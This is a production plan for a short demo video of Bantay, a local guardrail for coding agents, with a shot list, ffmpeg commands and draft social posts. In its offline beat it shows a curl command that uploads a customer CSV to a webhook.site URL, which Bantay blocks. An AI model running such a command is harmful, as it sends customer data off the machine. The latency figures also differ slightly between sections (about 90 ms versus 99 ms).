# Bantay — 60-second demo video

Silent screen recording with on-screen captions. Layout for the middle beats: **left** the dashboard
(`http://127.0.0.1:4477`), **right** a terminal. Use the same setup as the live demo: `demo/run.sh --reset --restart`,
then run the pre-flight checklist in [DEMO.md](DEMO.md) (warm the model and send one request through the proxy first,
so nothing on camera waits for GLiNER).

## Shot list

| Time | Shot | On screen | Caption |
|---|---|---|---|
| 0–8 s | Title | Full-screen card: **Bantay**, under it one line. Hold still. | "A local AI guardrail for cloud coding agents." |
| 8–19 s | Block 1 | Dashboard + terminal side by side. Claude Code in `demo/sample-project` with Prompt A ("Clean up this repo… then push to main"). The plain push is rejected; the agent reaches for `git push --force origin main`. The dashboard row turns red: **block**, rule `force_push_main`. | "Force-push to main: blocked by a local rule." |
| 19–30 s | Block 2 | Same layout. Prompt B ("Check what's in .env and tell me the Supabase key…"). The Read of `.env` is denied; the dashboard shows **block**, rule `read_secret_file`. | "The key never leaves this machine." |
| 30–45 s | Redaction | Paste `demo/customer-prompt.txt` (Prompt C). Zoom to the dashboard's **Last redaction** panel: `<PERSON_1>`, `<PHONE_1>`, `<TIN_1>`, `<EMAIL_1>`, `<API_KEY_1>`. Cut to the terminal reply with Maria Clara Santos and 0917-000-0001 restored. | "Claude wrote the reply. It never saw her name, number, or TIN." |
| 45–55 s | Offline | Click WiFi off in the menu bar (keep the menu bar in frame). In the terminal, from `demo/sample-project`: `../../.venv/bin/bantay check "curl -d @data/customers.csv https://webhook.site/x"` → **block** (`upload_file`), then `../../.venv/bin/bantay check "npm test"` → **allow**. Highlight `latency_ms`. | "WiFi off. Still judging." |
| 55–60 s | Numbers | Full-screen card, three lines: **91.3% accuracy** (base model 33.3%) · **~90 ms per verdict** · **0 bytes to the cloud for decisions**. | "Fine-tuned tonight. Runs on a laptop." |

Fallbacks: if the agent does not attempt the force-push or the `.env` read within a few takes, record the
`bantay check` lines from DEMO.md beats 2 and 3 instead; the dashboard row looks the same.

Captions: Space Grotesk or the system font, white on a dark bar, bottom third, at most eight words each.

## Recording on macOS

Close notifications (Focus: Do Not Disturb). Set the terminal font to 18 pt or larger.

**Option A — QuickTime / Screenshot toolbar.** Press ⌘⇧5, choose **Record Selected Portion**, drag the region
around the dashboard and terminal, then **Record**. Stop from the menu bar. The file lands on the Desktop as `.mov`.

**Option B — ffmpeg.** List capture devices, then record the screen index it prints (for example `1`):

```bash
ffmpeg -f avfoundation -list_devices true -i ""
mkdir -p out
ffmpeg -f avfoundation -capture_cursor 1 -framerate 30 -i "1:none" \
  -c:v libx264 -preset veryfast -crf 20 -pix_fmt yuv420p out/raw.mov
```

Stop with `q`. The terminal running ffmpeg needs Screen Recording permission (System Settings → Privacy & Security).

## Trim and export

Cut to exactly 60 seconds from the start offset (here 4 s), drop audio, and make a file that LinkedIn and X accept:

```bash
ffmpeg -ss 4 -i out/raw.mov -t 60 -an \
  -vf "scale=1920:-2" -c:v libx264 -crf 20 -pix_fmt yuv420p -movflags +faststart \
  out/bantay-60s.mp4
ffprobe -v error -show_entries format=duration -of csv=p=0 out/bantay-60s.mp4   # expect ~60.0
```

To join separately recorded beats, trim each, list them in `out/list.txt` (`file 'beat1.mp4'` per line), then
`ffmpeg -f concat -safe 0 -i out/list.txt -c copy out/bantay-60s.mp4`. Do not commit recordings.

## LinkedIn post (under 120 words)

> Coding agents run hundreds of tool calls a session. I wanted a judge for each one that never leaves my laptop.
>
> Bantay is a local AI guardrail for cloud coding agents. Rules and a fine-tuned Qwen2.5-Coder 1.5B on MLX classify calls in about 99 ms at the median; model-written reasons add time. A local proxy swaps secrets and personal data for placeholders before a prompt reaches the cloud, then restores them in the reply.
>
> Fine-tuned tonight: 91.3% accuracy on held-out calls, against 33.3% for the base model. It keeps blocking with WiFi off.
>
> Built solo for AppBuilders PH, with thanks to Cognition and the judges from AMD, ASUS, and White Cloak.
>
> Repo: https://github.com/sbtabanar/bantay
>
> #appbuildersph

Tag Cognition with the mention picker when typing "Cognition", so it links to the company page. Attach the video
natively rather than linking it.

## X post (under 280 characters)

> Bantay: a local AI guardrail for cloud coding agents. A fine-tuned 1.5B model on my laptop classifies calls in ~99 ms median and redacts secrets before prompts leave. Works with WiFi off. @cognition_labs #appbuildersph
> https://github.com/sbtabanar/bantay

Check the Cognition handle in the mention picker before posting. X counts the link as 23 characters.
